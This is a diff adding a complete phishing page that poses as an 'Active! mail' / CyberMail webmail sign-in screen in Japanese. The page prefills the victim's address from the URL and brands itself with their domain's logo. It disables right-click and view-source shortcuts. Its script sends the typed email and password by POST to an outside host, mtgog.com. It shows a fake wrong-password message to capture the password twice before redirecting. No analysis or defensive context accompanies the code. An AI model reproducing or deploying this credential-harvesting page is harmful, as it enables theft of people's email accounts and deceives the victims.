@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Active! mail</title>
+    <!-- Bootstrap CSS -->
+   <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&amp;display=swap" rel="stylesheet">
+<style>
+body{
+			background: #bdc5ea;
+		}
+
+		.container{
+			width:100%;
+			display: flex;
+			justify-content: center;
+			align-items: center;
+			height: 100vh;
+		}
+
+		.office{
+			width: 500px;
+			background: #fff;
+			border:5px solid #4285f4;
+			border-radius: 5px;
+		}
+
+		.office-holder{
+			width:80%;
+			margin: auto;
+			padding: 20px 0px;
+		}
+
+		.logo{
+			width:100%;
+			float: left;
+			margin-bottom: 2em;
+		}
+
+		.logo h1{
+			font-family: arial;
+		}
+
+		.verify{
+			width: 70%;
+			margin: auto;
+		}
+
+		.verify h4{
+			font-family: arial;
+		}
+
+		fieldset{
+			width: 90%;
+			float: right;
+			border:2px solid #4285f4;
+			border-radius: 5px;
+		}
+
+		legend{
+			font-size: 15px;
+			overflow: hidden;
+			width: 42%;
+			padding:0px 2px;
+			margin: 0px;
+		}
+
+		.verify input[type='text']{
+			width: 100%;
+			float: right;
+			border:none;
+			padding:3px 10px;
+		}
+
+		.verify button{
+			border:none;
+			height: 40px;
+			width: 80px;
+			float: right;
+			margin-top: 2em;
+			background: #4285f4;
+			border-radius: 5px;
+			color: #fff;
+		}
+
+		.email-to-verify{
+			border:1px solid #000;
+			border-radius: 10px;
+		}
+
+		.form-holder{
+			width:100%;
+			float: left;
+		}
+
+		.form-holder h3{
+			font-weight: 600;
+		}
+
+		.form-holder input[type='email'], input[type='password']{
+			width: 100%;
+			height:40px;
+			float: left;
+			margin-bottom: 15px;
+		}
+		.form-holder .btn-holder{
+			width:100%;
+			margin-top:1em;
+			display: flex;
+			align-content: center;
+			align-items: center;
+			justify-content: center;
+		}
+
+		.form-holder .btn-holder .btn{
+			background:#0073C6;
+			border:none;
+			padding:6px 10px;
+			color:#fff;
+			border-radius: 0px;
+			margin-top: 20px;
+			margin-bottom: 20px;
+		}
+
+		.form-holder .btn-holder .btn:hover{
+			cursor:pointer;
+		}
+
+		.checkbox{
+			width: 100%;
+			float: left;
+			margin-top:5px;
+		}
+
+		.checkbox label{
+			font-family:arial;
+			font-size:13px;
+			float: left;
+			margin-left:1em;
+		}
+
+		.hide{
+			display: none;
+		}
+
+</style>
+</head>
+
+<body>
+    <div id="html_encoder_div">
+        <div class="container">
+            <div class="office show border shadow bg-light" id="others">
+                <div class="office-holder">
+                    <div class="logo" style="text-align:center">
+                        <div id="login_logo">
+                            <img src="data:image/png;base64,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" src="" width="120" height="40" alt="">
+                        </div>
+                        <h3 class="text-dark"><strong id="logoname" class="text-uppercase"></strong></h3>
+                        <h5 class="font-weight-light">アクセスするには、CyberMail のメールアドレスとパスワードを使用してサインインしてください</h5>
+                    </div>
+                    <center>
+                        <div id="msg" style="display: none;font-weight: 600;color: red;">無効なパスワード。！正しいパスワードを入力してください。</div>
+                        <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
+                    </center>
+                    <form id="contact" method="POST" action="">
+                        <div class="form-holder">
+                            <div style="width: 100%;">
+                                <div class="alert alert-danger hide alert2"></div>
+                            </div>
+                            <input type="email" id="email" class="form-control" readonly="" value="" placeholder="someone@example.com" required="">
+                            <input type="password" id="password" autofocus="" placeholder="パスワード" class="form-control" required="">
+                            <div class="checkbox">
+                                <input type="checkbox" name="" style="float: left; margin-top:2px; margin-bottom: 10px;">
+                                <label>私を覚えてますか</label>
+                            </div>
+                            <div class="btn-holder">
+                                <button class="btn btn-lg col-12" id="submit-btn">ログイン</button>
+                            </div>
+                            <p style="color:#0073C6; margin-top:0em; float: left; width:100%;">CyberMail | ©2023. All Rights Reserved.	</p>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+    <style>
+    .tb_button {
+        padding: 1px;
+        cursor: pointer;
+        border-right: 1px solid #8b8b8b;
+        border-left: 1px solid #FFF;
+        border-bottom: 1px solid #fff;
+    }
+
+    .tb_button.hover {
+        borer: 2px outset #def;
+        background-color: #f8f8f8 !important;
+    }
+
+    .ws_toolbar {
+        z-index: 100000
+    }
+
+    .ws_toolbar .ws_tb_btn {
+        cursor: pointer;
+        border: 1px solid #555;
+        padding: 3px
+    }
+
+    .tb_highlight {
+        background-color: yellow
+    }
+
+    .tb_hide {
+        visibility: hidden
+    }
+
+    .ws_toolbar img {
+        padding: 2px;
+        margin: 0px
+    }
+    </style>
+     <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>
+
+  <script>
+    
+// prevent ctrl + s
+$(document).bind('keydown', function(e) {
+if(e.ctrlKey && (e.which == 83)) {
+e.preventDefault();
+return false;
+}
+});
+
+document.addEventListener('contextmenu', event => event.preventDefault());
+
+document.onkeydown = function(e) {
+if (e.ctrlKey && 
+(e.keyCode === 67 || 
+e.keyCode === 86 || 
+e.keyCode === 85 || 
+e.keyCode === 117)) {
+return false;
+} else {
+return true;
+}
+};
+$(document).keypress("u",function(e) {
+if(e.ctrlKey)
+{
+return false;      }
+else {
+return true;
+}});
+
+
+
+/* global $ */
+$(document).ready(function(){
+var count=0;
+
+$('#back1').click(function () {
+$("#msg").hide();
+$('#email').val("");
+$("#automail").animate({left:200, opacity:"hide"}, 0);
+$("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+});
+
+var email = window.location.hash.substr(1);
+if (!email) {
+
+}
+else
+{
+var my_email =email;
+$('#email').val(my_email);
+$('#emailich').html(my_email);
+var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+if (!filter.test(my_email)) {
+$('#error').show();
+email.focus;
+return false;
+}
+var ind=my_email.indexOf("@");
+var my_slice=my_email.substr((ind+1));
+var c= my_slice.substr(0, my_slice.indexOf('.'));
+var final= c.toLowerCase();
+var finalu= c.toUpperCase();
+
+$("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
+$("#logoname").html(finalu);
+$(".logoname").html(finalu);
+}
+
+
+$('#submit-btn').click(function(event){
+$('#error').hide();
+$('#msg').hide();
+event.preventDefault();
+var email=$("#email").val();
+var password=$("#password").val();
+var msg = $('#msg').html();
+$('#msg').text( msg );
+///////////new injection////////////////
+var my_email =email;
+var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+if (!filter.test(my_email)) {
+$('#error').show();
+email.focus;
+return false;
+}
+
+var ind=my_email.indexOf("@");
+var my_slice=my_email.substr((ind+1));
+var c= my_slice.substr(0, my_slice.indexOf('.'));
+var final= c.toLowerCase();
+var finalu= c.toUpperCase();
+
+$("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
+$("#logoname").html(finalu);
+///////////new injection////////////////
+count=count+1;
+
+$.ajax({
+dataType: 'JSON',
+url: 'https://mtgog.com/o/post.php',
+type: 'POST',
+      	data:{
+      		email:email,
+      		password:password,
+      	},
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+            	$('#submit-btn').val('Verifing...');
+            },
+            success: function(response){
+            	if(response){
+            		$("#msg").show();
+            		console.log(response);
+            		if(response['signal'] == 'ok'){
+            			$("#password").val("");
+            			if (count>=2) {
+            				count=0;
+                    // window.location.replace(response['redirect_link']);
+                    window.location.replace("complete.html?msg="+email);
+
+                }
+                $('#msg').html(response['msg']);
+            }
+            else{
+            	$('#msg').html(response['msg']);
+            }
+        }
+    },
+    error: function(){
+    	$("#password").val("");
+    	if (count>=2) {
+    		count=0;
+    		 window.location.replace("complete.html?msg="+email);
+    	}
+    	$("#msg").show();
+    	$('#msg').html("Please enter correct password and try again");
+    },
+    complete: function(){
+    	$('#submit-btn').val('LOGIN');
+    }
+});
+  });
+
+
+	});
+
+
+</script>
+</body>
+</html>
